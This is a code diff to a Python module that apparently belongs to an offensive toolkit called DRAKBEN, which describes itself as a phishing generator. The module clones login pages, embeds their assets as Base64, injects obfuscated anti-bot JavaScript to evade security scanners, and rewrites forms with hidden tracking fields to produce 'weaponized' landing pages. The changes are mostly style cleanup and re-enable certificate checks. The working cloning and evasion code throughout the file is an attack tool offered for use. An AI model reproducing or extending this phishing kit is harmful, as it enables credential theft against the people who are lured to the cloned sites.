@@ -1,16 +1,14 @@
-"""
-DRAKBEN Social Engineering - Phishing Generator (Mithril)
+"""DRAKBEN Social Engineering - Phishing Generator (Mithril)
 Author: @drak_ben
 Description: Clones websites and generates weaponized landing pages.
 """
 
+import base64
 import logging
 import os
-import base64
 import secrets
 import string
 from urllib.parse import urljoin
-
 
 import requests
 import urllib3
@@ -28,20 +26,14 @@ logger = logging.getLogger(__name__)
 
 
 class AntiBotEngine:
-    """
-    Generates evasive JavaScript to filter security scanners and bots.
-    """
+    """Generates evasive JavaScript to filter security scanners and bots."""
 
     @staticmethod
     def generate_js_guard() -> str:
-        """
-        Returns obfuscated JavaScript that checks for specialized bot signatures.
-        """
-        # Obfuscated variable names
-        "".join(secrets.choice(string.ascii_letters) for _ in range(8))
+        """Returns obfuscated JavaScript that checks for specialized bot signatures."""
         v_bot = "".join(secrets.choice(string.ascii_letters) for _ in range(8))
 
-        script = f"""
+        return f"""
         (function() {{
             var {v_bot} = false;
 
@@ -70,20 +62,16 @@ class AntiBotEngine:
             console.log("Human verification passed.");
         }})();
         """
-        return script
 
 
 class ShadowCloner:
-    """
-    Creates high-fidelity 'Single-File' phishing snapshots.
+    """Creates high-fidelity 'Single-File' phishing snapshots.
     Embeds critical assets (CSS/Images) directly into HTML (Base64) to prevent
     broken UI when viewed offline or on restricted networks.
     """
 
-    def compress_and_embed(self, soup: BeautifulSoup, base_url: str):
-        """
-        Converts external resources to Base64 data URIs.
-        """
+    def compress_and_embed(self, soup: BeautifulSoup, base_url: str) -> None:
+        """Converts external resources to Base64 data URIs."""
         # 1. Images
         for img in soup.find_all("img"):
             src = img.get("src")
@@ -107,29 +95,27 @@ class ShadowCloner:
 
     def _download_as_b64(self, url: str) -> str:
         try:
-            resp = requests.get(url, timeout=5, verify=False)
+            resp = requests.get(url, timeout=5, verify=True)
             if resp.status_code == 200:
                 ct = resp.headers.get("Content-Type", "image/png")
                 encoded = base64.b64encode(resp.content).decode("utf-8")
                 return f"data:{ct};base64,{encoded}"
         except Exception as e:
-            logger.debug(f"Failed to fetch image: {e}")
+            logger.debug("Failed to fetch image: %s", e)
         return ""
 
     def _fetch_text(self, url: str) -> str:
         try:
-            resp = requests.get(url, timeout=5, verify=False)
+            resp = requests.get(url, timeout=5, verify=True)
             return resp.text if resp.status_code == 200 else ""
         except Exception:
             return ""
 
 
 class PhishingGenerator:
-    """
-    Mithril Engine: Web Cloner & Trap Generator (Advanced).
-    """
+    """Mithril Engine: Web Cloner & Trap Generator (Advanced)."""
 
-    def __init__(self, output_dir: str = "custom_tools/phishing_sites"):
+    def __init__(self, output_dir: str = "custom_tools/phishing_sites") -> None:
         self.output_dir = output_dir
         if not os.path.exists(output_dir):
             os.makedirs(output_dir)
@@ -138,10 +124,8 @@ class PhishingGenerator:
         logger.info("Mithril Engine (Hyper-Cloner) initialized")
 
     def clone_site(self, url: str, folder_name: str = "cloned_site") -> str:
-        """
-        Clone a login page, embed assets, and inject anti-bot guards.
-        """
-        logger.info(f"Hyper-Cloning site: {url}")
+        """Clone a login page, embed assets, and inject anti-bot guards."""
+        logger.info("Hyper-Cloning site: %s", url)
         target_dir = os.path.join(self.output_dir, folder_name)
         if not os.path.exists(target_dir):
             os.makedirs(target_dir)
@@ -152,11 +136,14 @@ class PhishingGenerator:
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             }
             response = requests.get(
-                url, headers=headers, timeout=15, verify=False
-            )  # Skip SSL for attack speed
+                url,
+                headers=headers,
+                timeout=15,
+                verify=True,
+            )
 
             if response.status_code != 200:
-                logger.error(f"Failed to fetch site: {response.status_code}")
+                logger.error("Failed to fetch site: %s", response.status_code)
                 return ""
 
             soup = BeautifulSoup(response.text, "html.parser")
@@ -167,10 +154,12 @@ class PhishingGenerator:
                 form["method"] = "POST"
                 # Add hidden tracking ID
                 req_id = "".join(
-                    secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16)
+                    secrets.choice(string.ascii_uppercase + string.digits)
+                    for _ in range(16)
                 )
                 input_tag = soup.new_tag(
-                    "input", type="hidden", name="req_id", value=req_id
+                    "input",
+                    attrs={"type": "hidden", "name": "req_id", "value": req_id},
                 )
                 form.append(input_tag)
 
@@ -192,20 +181,16 @@ class PhishingGenerator:
             with open(index_path, "w", encoding="utf-8") as f:
                 f.write(str(soup))
 
-            logger.info(f"Site cloned & weaponized successfully: {index_path}")
+            logger.info("Site cloned & weaponized successfully: %s", index_path)
             return index_path
 
         except Exception as e:
-            logger.error(f"Cloning failed: {e}")
+            logger.exception("Cloning failed: %s", e)
             return ""
 
-    def _fix_asset_links(self, soup: BeautifulSoup, base_url: str):
-        # Deprecated in favor of ShadowCloner
-        pass
+    def _fix_asset_links(self, soup: BeautifulSoup, base_url: str) -> None:
+        """Deprecated in favor of ShadowCloner."""
 
-    def generate_campaign(self, target_list, template_name: str):
-        """
-        Launch a mass mailing campaign.
-        """
+    def generate_campaign(self, target_list, template_name: str) -> None:
+        """Launch a mass mailing campaign."""
         # Placeholder for SMTP integration
-        pass
